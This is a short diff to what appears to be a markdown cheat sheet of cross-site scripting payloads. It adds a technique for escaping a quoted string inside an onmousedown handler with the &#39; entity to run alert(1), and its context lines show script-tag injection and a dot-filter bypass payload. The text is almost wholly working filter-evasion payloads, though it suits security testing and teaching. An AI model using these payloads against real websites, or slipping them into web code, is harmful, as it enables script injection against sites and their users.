@@ -378,6 +378,13 @@ http://localhost/bla.php?test=</script><script>alert(1)</script>
 </html>
 ```
 
+Bypass quotes in mousedown event
+```
+<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
+
+You can bypass a single quote with &#39; in an on mousedown event handler
+```
+
 Bypass dot filter 
 ```
 <script>window['alert'](document['domain'])<script>
